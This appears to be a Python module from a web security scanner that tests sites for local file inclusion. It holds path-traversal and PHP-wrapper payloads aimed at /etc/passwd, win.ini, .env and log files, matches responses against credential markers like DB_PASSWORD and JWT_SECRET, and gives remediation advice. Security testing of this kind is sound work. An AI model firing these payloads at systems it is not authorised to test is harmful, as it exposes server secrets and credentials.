#!/usr/bin/env python3
"""
Local File Inclusion (LFI) vulnerability scanner.
Tests for path traversal and file inclusion vulnerabilities.

References:
    - OWASP: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
    - CWE-22: Improper Limitation of a Pathname to a Restricted Directory
"""

import re
import os
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlencode, parse_qs, urlparse
from loguru import logger


class Scanner:
    """Local File Inclusion vulnerability scanner."""
    
    def __init__(self, browser, target_url: str, config: Dict):
        """
        Initialize LFI scanner.
        
        Args:
            browser: StealthBrowser instance
            target_url: Target URL to scan
            config: Configuration dictionary
        """
        self.browser = browser
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.findings = []
        self.module_name = "Local File Inclusion (LFI)"
        
        # LFI payloads organized by target file
        self.payloads = {
            'linux': [
                '../../../../../../../../etc/passwd',
                '../../../etc/passwd',
                '....//....//....//....//etc/passwd',
                '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
                '..%252F..%252F..%252F..%252Fetc%252Fpasswd',
                '/etc/passwd',
                '/etc/passwd%00',
                '/etc/passwd\x00',
                'php://filter/convert.base64-encode/resource=/etc/passwd',
                'php://filter/read=convert.base64-encode/resource=/etc/passwd',
                'file:///etc/passwd',
            ],
            'windows': [
                '..\\..\\..\\..\\windows\\win.ini',
                '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                'C:\\windows\\win.ini',
                'C:\\windows\\system32\\drivers\\etc\\hosts',
                'file:///C:/windows/win.ini',
            ],
            'php': [
                'php://filter/convert.base64-encode/resource=index.php',
                'php://filter/read=convert.base64-encode/resource=index',
                'php://input',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
                'expect://id',
            ],
            'logs': [
                '/var/log/apache2/access.log',
                '/var/log/apache2/error.log',
                '/var/log/nginx/access.log',
                '/var/log/nginx/error.log',
                '/var/log/httpd/access_log',
            ],
            'config': [
                '/etc/php.ini',
                '/etc/my.cnf',
                '/etc/httpd/conf/httpd.conf',
                '/etc/nginx/nginx.conf',
                '.env',
                '.git/config',
                '../.env',
                '../../.env',
                '....//....//.env',
            ],
        }
        
        # Indicators of successful LFI
        self.success_indicators = {
            'passwd': [
                'root:x:0:0:',
                'daemon:x:1:1:',
                'bin:x:2:2:',
                'nobody:x:',
            ],
            'win_ini': [
                '[fonts]',
                '[extensions]',
                '[files]',
                '[Mail]',
            ],
            'php_config': [
                '<?php',
                'phpinfo()',
                'PHP Version',
            ],
            'env_file': [
                'DB_HOST=',
                'DB_USERNAME=',
                'DB_PASSWORD=',
                'APP_KEY=',
                'JWT_SECRET=',
                'API_KEY=',
            ],
        }
    
    def run(self) -> Dict:
        """
        Execute LFI vulnerability tests.
        
        Returns:
            Dict with findings and test results
        """
        logger.info(f"Starting {self.module_name} scan")
        
        result = {
            'module': self.module_name,
            'urls_tested': [],
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'findings': []
        }
        
        # Find testable parameters
        test_urls = self._discover_parameters()
        
        for url, params in test_urls:
            result['urls_tested'].append(url)
            
            for param_name in params:
                result['parameters_tested'].append(param_name)
                is_vulnerable = self._test_parameter(url, param_name, params)
                
                if is_vulnerable:
                    result['vulnerable_parameters'].append({
                        'url': url,
                        'parameter': param_name,
                        'type': is_vulnerable['type'],
                        'evidence': is_vulnerable['evidence']
                    })
        
        # Generate findings
        for vuln in result['vulnerable_parameters']:
            self.findings.append({
                'title': f"Local File Inclusion in '{vuln['parameter']}' parameter",
                'severity': 'high',
                'description': (
                    f"Local File Inclusion vulnerability detected in the '{vuln['parameter']}' "
                    f"parameter at {vuln['url']}. This allows an attacker to read arbitrary "
                    f"files from the server filesystem, potentially exposing sensitive "
                    f"configuration files, source code, and system files."
                ),
                'recommendation': (
                    "1. Use a whitelist of allowed files instead of user input\n"
                    "2. Sanitize and validate all user-supplied file paths\n"
                    "3. Use basename() to strip directory components\n"
                    "4. Implement a chroot jail or restrict file access\n"
                    "5. Disable allow_url_fopen and allow_url_include in PHP\n"
                    "6. Use realpath() to resolve and validate paths"
                ),
                'module': self.module_name,
                'cwe_id': 'CWE-22',
                'cvss_score': 7.5,
                'evidence': vuln['evidence'],
                'references': [
                    'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion',
                    'https://cwe.mitre.org/data/definitions/22.html',
                ]
            })
        
        result['findings'] = self.findings
        
        logger.info(f"{self.module_name} complete. Found {len(self.findings)} vulnerabilities")
        return result
    
    def _discover_parameters(self) -> List:
        """Discover URLs with file/include parameters."""
        test_urls = []
        
        # Common LFI-vulnerable parameter names
        lfi_params = [
            'file', 'page', 'path', 'include', 'dir', 'document',
            'folder', 'root', 'serve', 'template', 'view', 'load',
            'read', 'open', 'cat', 'source', 'url', 'download',
            'filename', 'filepath', 'f', 'p', 'inc',
        ]
        
        # Check main page
        resp = self.browser.get('/')
        if resp and resp.status_code == 200:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Find all links
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                if '?' in href:
                    full_url = urljoin(self.target_url, href)
                    parsed = urlparse(full_url)
                    query_params = parse_qs(parsed.query)
                    
                    # Check if URL has LFI-like parameters
                    for param in query_params:
                        if any(lfi_param in param.lower() for lfi_param in lfi_params):
                            test_urls.append((full_url, query_params))
            
            # Find all forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                inputs = {}
                for input_tag in form.find_all(['input', 'select']):
                    name = input_tag.get('name', '')
                    if name:
                        inputs[name] = input_tag.get('value', 'test')
                        
                        # Check if form has LFI-like parameters
                        if any(lfi_param in name.lower() for lfi_param in lfi_params):
                            form_url = urljoin(self.target_url, action) if action else resp.url
                            test_urls.append((form_url, inputs))
        
        # Always test common paths
        common_paths = [
            '/index.php?page=',
            '/view.php?file=',
            '/download.php?file=',
            '/template.php?path=',
            '/include.php?file=',
            '/show.php?document=',
        ]
        
        for path in common_paths:
            full_url = urljoin(self.target_url, path)
            test_urls.append((full_url, {path.split('=')[0].split('?')[-1]: 'test'}))
        
        return test_urls[:20]  # Limit to prevent excessive requests
    
    def _test_parameter(self, url: str, param_name: str, params: Dict) -> Optional[Dict]:
        """
        Test a parameter for LFI vulnerability.
        
        Args:
            url: Target URL
            param_name: Parameter name to test
            params: All parameters
        
        Returns:
            Dict with vulnerability info or None
        """
        # Test Linux passwd file
        for payload in self.payloads['linux'][:5]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                for indicator in self.success_indicators['passwd']:
                    if indicator in resp.text:
                        logger.info(f"LFI found! File: /etc/passwd via {param_name}")
                        return {
                            'type': 'linux_passwd',
                            'payload': payload,
                            'evidence': f"Response contains '{indicator}'"
                        }
        
        # Test Windows files
        for payload in self.payloads['windows'][:3]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                for indicator in self.success_indicators['win_ini']:
                    if indicator in resp.text:
                        logger.info(f"LFI found! File: win.ini via {param_name}")
                        return {
                            'type': 'windows_file',
                            'payload': payload,
                            'evidence': f"Response contains '{indicator}'"
                        }
        
        # Test PHP filter wrapper
        for payload in self.payloads['php'][:2]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                # Check for base64 encoded PHP source
                if len(resp.text) > 50:
                    base64_pattern = r'^[A-Za-z0-9+/=]+$'
                    if re.match(base64_pattern, resp.text.strip()):
                        logger.info(f"LFI found! PHP filter via {param_name}")
                        return {
                            'type': 'php_filter',
                            'payload': payload,
                            'evidence': 'Base64 encoded response detected'
                        }
        
        # Test environment files
        for payload in self.payloads['config'][-3:]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                for indicator in self.success_indicators['env_file']:
                    if indicator in resp.text:
                        logger.info(f"LFI found! Config file via {param_name}")
                        return {
                            'type': 'config_file',
                            'payload': payload,
                            'evidence': f"Response contains '{indicator}'"
                        }
        
        return None